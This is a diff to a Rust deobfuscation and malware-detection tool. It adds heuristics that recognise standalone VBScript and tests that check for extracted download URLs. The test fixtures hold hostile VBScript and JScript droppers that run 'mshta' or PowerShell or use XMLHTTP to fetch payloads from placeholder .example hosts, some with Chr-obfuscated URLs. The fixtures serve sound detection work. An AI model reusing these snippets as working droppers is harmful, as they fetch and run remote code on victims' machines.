@@ -4364,6 +4364,93 @@ fn pre_scan_utf16_script_blob(decoded: &str, env: &mut Environment) {
     }
 }
 
+fn push_unique_payload(payloads: &mut Vec<Vec<u8>>, payload: Vec<u8>) {
+    if !payloads.iter().any(|existing| existing == &payload) {
+        payloads.push(payload);
+    }
+}
+
+fn looks_like_vbs_script(lower: &str) -> bool {
+    lower.contains("createobject")
+        || lower.contains("wscript")
+        || lower.contains("xmlhttp")
+        || lower.contains("option explicit")
+        || lower.contains("private function")
+        || lower.contains("\ndim ")
+        || lower.starts_with("dim ")
+        || lower.contains("\nsub ")
+        || lower.starts_with("sub ")
+        || lower.contains("\npublic sub ")
+        || lower.starts_with("public sub ")
+        || lower.contains("\nprivate sub ")
+        || lower.starts_with("private sub ")
+        || lower.contains("\npublic function ")
+        || lower.starts_with("public function ")
+        || ((lower.contains("\nfunction ") || lower.starts_with("function "))
+            && lower.contains("end function"))
+}
+
+fn looks_like_js_script(lower: &str) -> bool {
+    lower.contains("activexobject")
+        || lower.contains("<script")
+        || lower.contains("document.")
+        || lower.contains("window.")
+        || lower.contains("function ")
+        || lower.contains("var ")
+        || lower.contains("eval(")
+}
+
+fn first_meaningful_script_line(lower: &str) -> &str {
+    lower
+        .trim_start_matches('\u{feff}')
+        .lines()
+        .map(str::trim_start)
+        .find(|line| {
+            let trimmed = line.trim();
+            !trimmed.is_empty()
+                && !trimmed.starts_with('\'')
+                && !trimmed.starts_with("//")
+                && !trimmed.starts_with("/*")
+        })
+        .unwrap_or("")
+}
+
+fn starts_like_standalone_vbs(lower: &str) -> bool {
+    let first = first_meaningful_script_line(lower);
+    first.starts_with("dim ")
+        || (first.starts_with("const ") && !looks_like_js_script(lower))
+        || (first.starts_with("set ") && first.contains("createobject"))
+        || (first.starts_with("with ") && first.contains("createobject"))
+        || ((first.starts_with("execute ") || first.starts_with("executeglobal "))
+            && first.contains("createobject"))
+        || first.starts_with("option explicit")
+        || first.starts_with("private function")
+        || first.starts_with("on error ")
+        || first.starts_with("sub ")
+        || first.starts_with("public sub ")
+        || first.starts_with("private sub ")
+        || first.starts_with("public function ")
+        || (first.starts_with("function ") && lower.contains("end function"))
+}
+
+fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) -> bool {
+    let text = String::from_utf8_lossy(input);
+    let has_vbs_atom = crate::util::contains_ascii_case_insensitive(&text, "createobject")
+        || crate::util::contains_ascii_case_insensitive(&text, "wscript")
+        || crate::util::contains_ascii_case_insensitive(&text, "xmlhttp")
+        || crate::util::contains_ascii_case_insensitive(&text, "option explicit");
+    if !has_vbs_atom {
+        return false;
+    }
+
+    let lower = text.to_ascii_lowercase();
+    if starts_like_standalone_vbs(&lower) && looks_like_vbs_script(&lower) {
+        push_unique_payload(&mut env.all_extracted_vbs, text.as_bytes().to_vec());
+        return true;
+    }
+    false
+}
+
 fn decode_utf16le_script_blob(input: &[u8]) -> Option<String> {
     /// Hard cap on attacker-supplied UTF-16LE blob size. Without this, a
     /// library consumer (the CLI applies its own input cap but downstream
@@ -4480,6 +4567,7 @@ fn analyze_inner(input: &[u8], cfg: &Config, file_path: Option<std::path::PathBu
         env.delayed_expansion = true;
     }
     pre_scan_polyglot_script_block(input, &mut env);
+    let standalone_script_input = pre_scan_standalone_script_input(input, &mut env);
     deob_scan::scan_raw_marker_powershell_urls(input, &mut env);
     if looks_like_pe(input) {
         env.traits.push(Trait::DisguisedBinary {
@@ -4505,6 +4593,8 @@ fn analyze_inner(input: &[u8], cfg: &Config, file_path: Option<std::path::PathBu
         if let Some(decoded) = decode_utf16le_script_blob(input) {
             pre_scan_utf16_script_blob(&decoded, &mut env);
             out = decoded;
+        } else if standalone_script_input {
+            out = String::from_utf8_lossy(input).into_owned();
         } else {
             drive(input, &mut env, &mut out);
         }
@@ -16944,6 +17034,204 @@ sh.Run "mshta vbs-run-schemeless.example/payload.hta", 0, False"#;
             )),
             "no Download trait from VBS WScript.Shell.Run schemeless URL: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_shell_run_chr_concat_url_extracted() {
+        let vbs = br#"Dim cmd
+cmd = "mshta " & Chr(104) & "ttp://standalone-vbs-run.example/payload.hta"
+Set sh = CreateObject("WScript.Shell")
+sh.Run cmd, 0, False"#;
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "http://standalone-vbs-run.example/payload.hta"
+            )),
+            "no Download trait from standalone VBS WScript.Shell.Run Chr concat URL: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains(
+                r#"cmd = "mshta " & Chr(104) & "ttp://standalone-vbs-run.example/payload.hta""#
+            ),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_on_error_prefix_shell_run_url_extracted() {
+        let vbs = br#"On Error Resume Next
+Dim cmd
+cmd = "mshta http://standalone-vbs-onerror.example/payload.hta"
+Set sh = CreateObject("WScript.Shell")
+sh.Run cmd, 0, False"#;
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "http://standalone-vbs-onerror.example/payload.hta"
+            )),
+            "no Download trait from standalone VBS with On Error prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("On Error Resume Next\nDim cmd"),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_sub_prefix_shell_run_url_extracted() {
+        let vbs = br#"Sub Main()
+Set sh = CreateObject("WScript.Shell")
+sh.Run "mshta http://standalone-vbs-sub.example/payload.hta", 0, False
+End Sub
+Main"#;
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "http://standalone-vbs-sub.example/payload.hta"
+            )),
+            "no Download trait from standalone VBS with Sub prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("Sub Main()\nSet sh"),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_public_sub_prefix_shell_run_url_extracted() {
+        let vbs = br#"Public Sub Main()
+Set sh = CreateObject("WScript.Shell")
+sh.Run "mshta http://standalone-vbs-public-sub.example/payload.hta", 0, False
+End Sub
+Main"#;
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "http://standalone-vbs-public-sub.example/payload.hta"
+            )),
+            "no Download trait from standalone VBS with Public Sub prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("Public Sub Main()\nSet sh"),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_script_prescan_ignores_direct_js_with_wscript() {
+        let mut env = Environment::new(&Config::default());
+        crate::pre_scan_standalone_script_input(
+            br#"var sh = new ActiveXObject("WScript.Shell")
+sh.Run("powershell -Command Invoke-WebRequest https://direct-js.example/p")"#,
+            &mut env,
+        );
+        assert!(
+            env.all_extracted_jscript.is_empty() && env.all_extracted_vbs.is_empty(),
+            "direct JScript was queued as standalone VBS: js={} vbs={}",
+            env.all_extracted_jscript.len(),
+            env.all_extracted_vbs.len()
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_function_prefix_shell_run_url_extracted() {
+        let vbs = br#"Function Main()
+Set sh = CreateObject("WScript.Shell")
+sh.Run "mshta http://standalone-vbs-function.example/payload.hta", 0, False
+End Function
+Main"#;
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "http://standalone-vbs-function.example/payload.hta"
+            )),
+            "no Download trait from standalone VBS with Function prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("Function Main()\nSet sh"),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_const_prefix_xmlhttp_url_extracted() {
+        let vbs = br#"Const u = "https://standalone-vbs-const.example/payload.txt"
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://standalone-vbs-const.example/payload.txt"
+            )),
+            "no Download trait from standalone VBS with Const prefix: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_with_createobject_prefix_xmlhttp_url_extracted() {
+        let vbs = br#"With CreateObject("MSXML2.XMLHTTP")
+.Open "GET", "https://standalone-vbs-with.example/payload.txt", False
+.Send
+End With"#;
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://standalone-vbs-with.example/payload.txt"
+            )),
+            "no Download trait from standalone VBS with With prefix: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_execute_prefix_xmlhttp_url_extracted() {
+        let vbs = br#"Execute "Set http = CreateObject(""MSXML2.XMLHTTP""): http.Open ""GET"", ""https://standalone-vbs-execute.example/payload.txt"", False: http.Send""#;
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://standalone-vbs-execute.example/payload.txt"
+            )),
+            "no Download trait from standalone VBS with Execute prefix: {:?}",
+            report.traits
         );
     }
 
